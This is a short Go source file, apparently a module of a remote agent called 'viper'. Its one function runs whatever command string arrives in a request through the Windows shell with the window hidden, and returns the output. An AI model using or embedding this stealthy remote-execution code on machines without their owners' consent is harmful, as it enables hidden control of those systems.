package modules

import (
	"log"
	"os/exec"
	"syscall"
	pb "viper/protos/cmds"
)

func RunShellCommand(req *pb.ShellCommandRequest) *pb.ShellCommandResponse {
	log.Printf("running shell command: '%s'", req.Cmd)
	cmd := exec.Command("cmd", "/C", req.Cmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("failed to run shell command: %v", err)
		return &pb.ShellCommandResponse{Err: err.Error()}
	}
	return &pb.ShellCommandResponse{Data: out}
}
